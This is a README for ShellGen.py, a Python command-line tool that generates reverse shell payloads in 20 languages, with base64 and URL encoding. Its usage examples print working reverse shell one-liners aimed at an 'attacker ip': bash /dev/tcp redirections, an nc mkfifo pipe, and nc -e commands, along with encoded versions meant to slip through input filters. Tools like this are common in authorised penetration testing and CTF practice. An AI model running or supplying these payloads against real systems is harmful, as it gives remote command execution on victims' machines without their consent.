# Shellgen.py 
---

     (`-').->  (`-').->  (`-')  _                                 (`-')  _ <-. (`-')_ 
     ( OO)_    (OO )__   ( OO).-/    <-.       <-.        .->     ( OO).-/    \( OO) )
    (_)--\_)  ,--. ,'-' (,------.  ,--. )    ,--. )    ,---(`-') (,------. ,--./ ,--/ 
    /    _ /  |  | |  |  |  .---'  |  (`-')  |  (`-') '  .-(OO )  |  .---' |   \ |  | 
    \_..`--.  |  `-'  | (|  '--.   |  |OO )  |  |OO ) |  | .-, \ (|  '--.  |  . '|  |)
    .-._)   \ |  .-.  |  |  .--'  (|  '__ | (|  '__ | |  | '.(_/  |  .--'  |  |\    |  
    \       / |  | |  |  |  `---.  |     |'  |     |' |  '-'  |   |  `---. |  | \   | 
     `-----'  `--' `--'  `------'  `-----'   `-----'   `-----'    `------' `--'  `--'

---
## ShellGen is a CLI, reverse shell generator made in python. Currently supports 20 different shell methods, base64 and url encoding.
## I got the idea for this tool from revshells.com and made a smaller CLI version
---
## 

    
    usage: shellgen.py [-h] [-i <attacker ip>] [-p <attacker port>] [-m method to use] [-l] [-b] [-u]

    optional arguments:
      -h, --help          show this help message and exit
      -i <attacker ip>    Attacker ip address to receive the connection back from victim machine. Default = 127.0.0.1
      -p <attacker port>  Attacker port to listen on. Default = 1337
      -m method to use    A comma seperated list of reverse shell methods. Default is bash
      -l                  List available methods for reverse shells
      -b                  Base64 encode the reverse shell output
      -u                  Url encode the reverse shell output


## Examples 
---
#### basic usage uses the three default methods, bash, python3, and nc default ip 127.0.0.1 and default port l337

    
    python3 shellgen.py 

    # No method specified with -m! Using defalt method of bash
    bash: 
        bash -i >& /dev/tcp/127.0.0.1/1337 0>&1 

        0<&196;exec 196<>/dev/tcp/127.0.0.1/1337; bash <&196 >&196 2>&196 

        exec 5<>/dev/tcp/127.0.0.1/1337;cat <&5 | while read line; do $line 2>&5 >&5; done 

#### specifying a method, ip, and port
    
    python3 shellgen.py -i 10.10.10.10 -m nc -p 9001
    
    nc: 
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.10.10 9001 >/tmp/f  

        nc -e bash 10.10.10.10 9001  

        nc.exe -e bash 10.10.10.10 9001

                                                           
## Base64 encoded payload

    python3 shellgen.py -i 10.10.10.10 -p 9001 -b -m nc
    
    nc: 
       IHJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8YmFzaCAtaSAyPiYxfG5jIDEwLjEwLjEwLjEwIDkwMDEgPi90bXAvZiA= 

       IG5jIC1lIGJhc2ggMTAuMTAuMTAuMTAgOTAwMSA= 

       bmMuZXhlIC1lIGJhc2ggMTAuMTAuMTAuMTAgOTAwMSA= 

## Url encoded payload
    python3 shellgen.py -i 10.10.10.10 -p 9001 -u -m nc
    nc: 
       %20rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7Cbash%20-i%202%3E%261%7Cnc%2010.10.10.10%209001%20%3E/tmp/f%20 

       %20nc%20-e%20bash%2010.10.10.10%209001%20 

       nc.exe%20-e%20bash%2010.10.10.10%209001%20 

### ShellGen supports the following shell methods
- php
- bash
- nc
- c
- c#
- perl
- php-pentest-monkey
- powershell
- python
- python3
- ruby
- nodejs
- javascript
- groovy
- telnet
- zsh
- lua
- golang
- awk
- dart


## To do
- add option to save to file
